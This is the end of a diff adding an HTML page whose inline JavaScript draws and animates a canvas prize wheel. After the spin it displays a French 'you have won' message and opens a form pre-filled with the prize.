+                ctx.stroke();
+                ctx.beginPath();
+                ctx.arc(cx, cy, hubR - 8, 0, 2 * Math.PI);
+                ctx.strokeStyle = 'rgba(180,140,70,0.5)';
+                ctx.lineWidth = 1.5;
+                ctx.stroke();
+                ctx.fillStyle = '#5c3a14';
+                ctx.font = 'bold 22px Georgia, serif';
+                ctx.textAlign = 'center';
+                ctx.textBaseline = 'middle';
+                ctx.fillText('FJ', cx, cy - 3);
+                ctx.fillStyle = '#c0392b';
+                ctx.font = '13px "Segoe UI", sans-serif';
+                ctx.fillText('❤', cx, cy + 20);
+            }
+
+            function drawPointer(cx, cy, wheelR) {
+                const tipY = cy - wheelR - OUTER_RING_WIDTH + 4;
+                const baseY = tipY - 40;
+                const halfW = 16;
+                ctx.beginPath();
+                ctx.moveTo(cx + 2, tipY + 3);
+                ctx.lineTo(cx - halfW + 2, baseY + 8);
+                ctx.lineTo(cx + halfW + 2, baseY + 8);
+                ctx.closePath();
+                ctx.fillStyle = 'rgba(0,0,0,0.18)';
+                ctx.fill();
+                ctx.beginPath();
+                ctx.moveTo(cx, tipY);
+                ctx.lineTo(cx - halfW, baseY);
+                ctx.quadraticCurveTo(cx - halfW, baseY - 8, cx - halfW + 6, baseY - 10);
+                ctx.lineTo(cx + halfW - 6, baseY - 10);
+                ctx.quadraticCurveTo(cx + halfW, baseY - 8, cx + halfW, baseY);
+                ctx.closePath();
+                const grad = ctx.createLinearGradient(cx, baseY, cx, tipY);
+                grad.addColorStop(0, '#b88030');
+                grad.addColorStop(0.5, '#d4a545');
+                grad.addColorStop(1, '#f0c860');
+                ctx.fillStyle = grad;
+                ctx.fill();
+                ctx.strokeStyle = 'rgba(140,100,30,0.7)';
+                ctx.lineWidth = 1.5;
+                ctx.stroke();
+                ctx.beginPath();
+                ctx.moveTo(cx - 4, tipY + 4);
+                ctx.lineTo(cx - 6, baseY + 6);
+                ctx.lineTo(cx, baseY + 2);
+                ctx.lineTo(cx - 1, tipY + 4);
+                ctx.closePath();
+                ctx.fillStyle = 'rgba(255,255,255,0.3)';
+                ctx.fill();
+            }
+
+            function drawSegmentText(cx, cy, r, midAngle, label) {
+                const textR = r * 0.64;
+                const tx = cx + Math.cos(midAngle) * textR;
+                const ty = cy + Math.sin(midAngle) * textR;
+                ctx.save();
+                ctx.translate(tx, ty);
+                ctx.rotate(midAngle + Math.PI / 2);
+                if (midAngle > Math.PI / 2 && midAngle < 3 * Math.PI / 2) ctx.rotate(Math.PI);
+                ctx.fillStyle = 'rgba(0,0,0,0.35)';
+                ctx.font = 'bold 13px "Segoe UI", sans-serif';
+                ctx.textAlign = 'center';
+                ctx.textBaseline = 'middle';
+                ctx.fillText(label, 1, 1);
+                ctx.fillStyle = '#ffffff';
+                ctx.fillText(label, 0, 0);
+                ctx.restore();
+            }
+
+            function drawWheel(angle) {
+                ctx.clearRect(0, 0, CANVAS_SIZE, CANVAS_SIZE);
+                const haloGrad = ctx.createRadialGradient(CENTER, CENTER, WHEEL_RADIUS - 30, CENTER, CENTER, WHEEL_RADIUS + OUTER_RING_WIDTH + 30);
+                haloGrad.addColorStop(0, 'rgba(255,220,160,0.08)');
+                haloGrad.addColorStop(0.7, 'rgba(220,170,100,0.18)');
+                haloGrad.addColorStop(1, 'rgba(180,130,70,0.0)');
+                ctx.beginPath();
+                ctx.arc(CENTER, CENTER, WHEEL_RADIUS + OUTER_RING_WIDTH + 30, 0, 2 * Math.PI);
+                ctx.fillStyle = haloGrad;
+                ctx.fill();
+                ctx.save();
+                ctx.translate(CENTER, CENTER);
+                ctx.rotate(angle);
+                ctx.translate(-CENTER, -CENTER);
+                for (let i = 0; i < NUM_SEGMENTS; i++) {
+                    const startAngle = i * SEGMENT_ANGLE;
+                    const endAngle = startAngle + SEGMENT_ANGLE;
+                    drawSegment(CENTER, CENTER, WHEEL_RADIUS, startAngle, endAngle, SEGMENT_COLORS[i]);
+                    drawSegmentText(CENTER, CENTER, WHEEL_RADIUS, startAngle + SEGMENT_ANGLE / 2, SEGMENT_LABELS[i]);
+                }
+                drawOuterRing(CENTER, CENTER, WHEEL_RADIUS, OUTER_RING_WIDTH);
+                drawRingLights(CENTER, CENTER, WHEEL_RADIUS, OUTER_RING_WIDTH);
+                ctx.restore();
+                drawCenterHub(CENTER, CENTER, INNER_HUB_RADIUS);
+                drawPointer(CENTER, CENTER, WHEEL_RADIUS);
+            }
+
+            function getWinningSegment(angle) {
+                const normalizedAngle = (angle % (2 * Math.PI) + 2 * Math.PI) % (2 * Math.PI);
+                const pointerAngle = (3 * Math.PI) / 2;
+                let relativeAngle = (pointerAngle - normalizedAngle + 2 * Math.PI) % (2 * Math.PI);
+                const segmentIndex = Math.floor(relativeAngle / SEGMENT_ANGLE);
+                return SEGMENT_LABELS[segmentIndex];
+            }
+
+            function update(timestamp) {
+                if (!lastTimestamp) lastTimestamp = timestamp;
+                const deltaTime = (timestamp - lastTimestamp) / 1000;
+                lastTimestamp = timestamp;
+                if (isSpinning) {
+                    currentAngle += angularVelocity * deltaTime;
+                    angularVelocity *= 0.991;
+                    if (angularVelocity < 0.15) {
+                        isSpinning = false;
+                        angularVelocity = 0;
+                        const prize = getWinningSegment(currentAngle);
+                        showResult(prize);
+                    }
+                }
+                drawWheel(currentAngle);
+                animationId = requestAnimationFrame(update);
+            }
+
+            function showResult(prize) {
+                wheelWrapper.classList.remove('spinning');
+                resultMessage.innerHTML = `
+                    <span class="emoji-celebration">🎉</span> Félicitations ! Vous avez gagné :
+                    <span class="prize-name">${prize}</span>
+                `;
+                resultMessage.classList.add('visible');
+                gainField.value = prize;
+                prizeDisplay.textContent = prize;
+                setTimeout(() => {
+                    formContainer.classList.add('expanded');
+                    formContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }, 800);
+            }
+
+            spinButton.addEventListener('click', () => {
+                if (isSpinning) return;
+                resultMessage.classList.remove('visible');
+                formContainer.classList.remove('expanded');
+                isSpinning = true;
+                wheelWrapper.classList.add('spinning');
+                const extraSpins = 5 + Math.random() * 5;
+                angularVelocity = extraSpins * 2 * Math.PI;
+                lastTimestamp = null;
+            });
+
+            drawWheel(currentAngle);
+            animationId = requestAnimationFrame(update);
+        })();
+    </script>
+</body>
+</html>
